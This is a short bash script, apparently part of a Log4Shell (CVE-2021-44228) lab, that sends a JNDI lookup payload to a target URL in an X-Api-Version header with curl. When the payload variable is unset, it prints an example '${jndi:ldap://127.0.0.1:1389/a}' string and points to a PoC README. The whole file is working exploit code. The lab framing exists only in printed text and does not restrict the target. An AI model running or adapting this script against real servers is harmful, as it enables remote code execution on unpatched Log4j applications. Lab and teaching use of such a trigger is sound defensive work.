#!/usr/bin/env bash
set -euo pipefail

TARGET_URL="${1:-http://127.0.0.1:8080/}"

if [ -z "${JNDI_PAYLOAD:-}" ]; then
  cat <<'EOM'
[!] Environment variable JNDI_PAYLOAD is not set.

Set it using the pattern documented in:
  - /opt/log4shell/CVE-2021-44228/README.md   (curl example)
  - InfoSec Writeups "Exploiting Log4Shell â€” How Log4J Applications Were Hacked"

Example (for THIS lab only, based on PoC):
  export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'

Then run:
  JNDI_PAYLOAD="$JNDI_PAYLOAD" /opt/log4shell/trigger-exploit.sh

This keeps the actual payload under your control for lab use only.
EOM
  exit 1
fi

echo "[*] Sending Log4Shell test payload to $TARGET_URL ..."
curl -s "$TARGET_URL" -H "X-Api-Version: $JNDI_PAYLOAD"
echo
